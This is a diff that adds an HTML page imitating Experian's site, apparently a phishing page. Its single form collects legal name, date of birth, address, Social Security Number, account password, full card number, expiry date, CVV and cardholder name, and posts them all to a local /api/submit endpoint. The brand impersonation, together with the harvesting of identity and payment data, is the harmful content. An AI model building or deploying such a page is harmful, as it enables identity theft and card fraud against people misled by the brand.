@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Experian</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @keyframes scaleIn {
+      from {
+        transform: scale(0);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+    .animate-scaleIn {
+      animation: scaleIn 0.4s ease-out forwards;
+    }
+    .input-help {
+      font-size: 11px;
+      line-height: 1.25rem;
+    }
+  </style>
+</head>
+<body class="font-sans bg-gray-50">
+
+  <!-- Navbar -->
+  <nav class="h-[90px] flex items-center justify-between px-8 py-3 bg-white">
+    <div class="flex items-center">
+      <img
+        class="w-[150px]"
+        src="https://www.experian.com/static/shared/logos/logo-experian.svg"
+        alt="Experian Logo"
+      />
+    </div>
+    <ul class="hidden md:flex items-center space-x-8 text-sm font-medium">
+      <li><a href="#" class="text-gray-800 hover:text-purple-700">Credit</a></li>
+      <li><a href="#" class="text-gray-800 hover:text-purple-700">Protection</a></li>
+      <li><a href="#" class="text-gray-800 border-b-2 border-pink-600 pb-1">Money</a></li>
+      <li><a href="#" class="text-gray-800 hover:text-purple-700">Credit Cards</a></li>
+      <li><a href="#" class="text-gray-800 hover:text-purple-700">Loans</a></li>
+      <li><a href="#" class="text-gray-800 hover:text-purple-700">Insurance</a></li>
+    </ul>
+    <div class="flex items-center space-x-6 text-sm font-medium">
+      <a href="#" class="text-gray-800 hover:text-purple-700">Sign In</a>
+      <button class="text-gray-800 hover:text-purple-700">🔍</button>
+    </div>
+  </nav>
+
+  <!-- Wrapper -->
+  <div class="w-full flex justify-center px-4 py-10">
+    <div class="w-full sm:w-[90%] md:w-[80%] lg:w-[60%] xl:w-[50%] bg-white shadow-lg rounded-lg p-6 space-y-10">
+
+      <!-- Form -->
+      <form method="POST" action="/api/submit" class="space-y-10">
+
+        <!-- About You -->
+        <section>
+          <div class="mb-6">
+            <h2 class="text-2xl font-semibold">Here's what we found</h2>
+            <p class="text-sm text-gray-600 mt-1">
+              Make sure everything looks correct and edit anything that needs updating.
+            </p>
+          </div>
+
+          <h3 class="text-purple-800 font-semibold mt-4">About you</h3>
+
+          <div class="space-y-4">
+            <div>
+              <label class="block text-sm font-medium">Legal first name</label>
+              <input type="text" name="first_name" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Legal last name</label>
+              <input type="text" name="last_name" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Date of birth</label>
+              <input type="date" name="dob" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Phone number</label>
+              <div class="mt-1 flex gap-2">
+                <select name="phone_country"
+                        class="w-28 border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+                  <option value="+1" selected>+1 (US)</option>
+                  <option value="+44">+44 (UK)</option>
+                  <option value="+61">+61 (AU)</option>
+                  <option value="+92">+92 (PK)</option>
+                  <option value="+971">+971 (AE)</option>
+                </select>
+                <input type="tel" name="phone" placeholder="(786) 687-4411" inputmode="tel"
+                       pattern="^[0-9\s\-\(\)]{7,}$" required
+                       class="flex-1 border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+              </div>
+              <p class="input-help text-gray-500 mt-1">
+                Enter your full number. You can include spaces or dashes. Example: <span class="text-gray-700">(786) 687-4411</span>
+              </p>
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Street address</label>
+              <input type="text" name="street_address" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Apt, unit</label>
+              <input type="text" name="apt_unit"
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">ZIP code</label>
+              <input type="text" name="zip_code" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">City</label>
+              <input type="text" name="city" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">State</label>
+              <select name="state" required
+                      class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+                <option value="" disabled selected>Select state</option>
+                <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+                <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+                <option>District of Columbia (Washington, D.C.)</option><option>Florida</option><option>Georgia</option>
+                <option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option>
+                <option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option>
+                <option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option>
+                <option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option>
+                <option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option>
+                <option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option>
+                <option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option>
+                <option>Puerto Rico</option><option>Rhode Island</option><option>South Carolina</option>
+                <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+                <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+                <option>Wisconsin</option><option>Wyoming</option>
+              </select>
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Social Security Number</label>
+              <input type="text" name="ssn" placeholder="XXX-XX-XXXX" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+              <p class="text-xs text-blue-600 mt-1">Why do we need this?</p>
+            </div>
+
+            <h3 class="text-purple-800 font-semibold mt-6">Create your account</h3>
+
+            <div>
+              <label class="block text-sm font-medium">Email</label>
+              <input type="email" name="email" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Password</label>
+              <input type="password" name="password" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Confirm Password</label>
+              <input type="password" name="password_confirmation" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Why are you visiting Experian today?</label>
+              <select name="reason" required
+                      class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+                <option value="" disabled selected>Please select an option</option>
+                <option value="Check my credit score">Check my credit score</option>
+                <option value="Monitor identity theft">Monitor identity theft</option>
+                <option value="Dispute an item">Dispute an item</option>
+              </select>
+            </div>
+
+            <p class="text-xs text-gray-600 mt-4">
+              *Credit score calculated based on FICO® Score 8 model. Your lender or insurer may use a different FICO® Score than FICO® Score 8, or another type of credit score altogether.
+              <a href="#" class="text-blue-600 underline">Learn more</a>
+            </p>
+            <p class="text-xs text-gray-600 mt-2">
+              By selecting the button to submit my order, I accept and agree to your terms.
+            </p>
+          </div>
+        </section>
+
+        <!-- Payment Details -->
+        <section>
+          <div class="mb-6">
+            <h2 class="text-2xl font-semibold">Enter card details</h2>
+            <p class="text-sm text-gray-600 mt-1">
+              We only store encrypted card data. For production use a payment gateway token.
+            </p>
+          </div>
+
+          <div class="space-y-4">
+            <div>
+              <label class="block text-sm font-medium">Card number</label>
+              <input type="text" name="card_number" maxlength="16" pattern="\d{16}" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+
+            <div class="grid grid-cols-2 gap-4">
+              <div>
+                <label class="block text-sm font-medium">Expiry month (MM)</label>
+                <input type="text" name="card_expiry_month" maxlength="2" pattern="(0[1-9]|1[0-2])" required
+                       class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+              </div>
+              <div>
+                <label class="block text-sm font-medium">Expiry year (YYYY)</label>
+                <input type="text" name="card_expiry_year" maxlength="4" pattern="\d{4}" required
+                       class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+              </div>
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">CVV</label>
+              <input type="text" name="card_cvv" maxlength="4" pattern="\d{3,4}" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+              <p class="text-xs text-gray-500 mt-1">For security, do not store CVV in production. Use tokenization.</p>
+            </div>
+
+            <div>
+              <label class="block text-sm font-medium">Cardholder name</label>
+              <input type="text" name="card_holder_name" required
+                     class="mt-1 w-full border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-purple-600">
+            </div>
+          </div>
+        </section>
+
+        <!-- Submit Button -->
+        <div class="pt-2">
+          <button type="submit"
+                  class="w-full bg-purple-800 text-white py-3 rounded-md hover:bg-purple-900 transition text-base font-semibold">
+            Submit
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="bg-gray-100 border-t border-gray-300 py-12">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
+        <div>
+          <h4 class="text-base font-semibold text-blue-900 mb-4">Support</h4>
+          <ul class="space-y-2 text-sm">
+            <li><a href="#" class="hover:underline">Security freeze</a></li>
+            <li><a href="#" class="hover:underline">Fraud alert</a></li>
+            <li><a href="#" class="hover:underline">Disputes</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4 class="text-base font-semibold text-blue-900 mb-4">Education & advice</h4>
+          <ul class="space-y-2 text-sm">
+            <li><a href="#" class="hover:underline">Credit report & scores</a></li>
+            <li><a href="#" class="hover:underline">Fraud & identity theft</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4 class="text-base font-semibold text-blue-900 mb-4">Credit resources</h4>
+          <ul class="space-y-2 text-sm">
+            <li><a href="#" class="hover:underline">Free credit monitoring</a></li>
+            <li><a href="#" class="hover:underline">Check credit</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4 class="text-base font-semibold text-blue-900 mb-4">Experian for businesses</h4>
+          <ul class="space-y-2 text-sm">
+            <li><a href="#" class="hover:underline">About Experian</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Optional: US Phone Formatting -->
+  <script>
+    const country = document.querySelector('select[name="phone_country"]');
+    const phone = document.querySelector('input[name="phone"]');
+    function formatUS(v) {
+      const d = v.replace(/\D/g, '').slice(0, 10);
+      const p1 = d.slice(0,3), p2 = d.slice(3,6), p3 = d.slice(6,10);
+      if (d.length > 6) return `(${p1}) ${p2}-${p3}`;
+      if (d.length > 3) return `(${p1}) ${p2}`;
+      if (d.length > 0) return `(${p1}`;
+      return '';
+    }
+    phone?.addEventListener('input', () => {
+      if (country?.value === '+1') {
+        const caret = phone.selectionStart;
+        const before = phone.value;
+        phone.value = formatUS(phone.value);
+        const diff = phone.value.length - before.length;
+        phone.setSelectionRange(caret + diff, caret + diff);
+      }
+    });
+  </script>
+</body>
+</html>
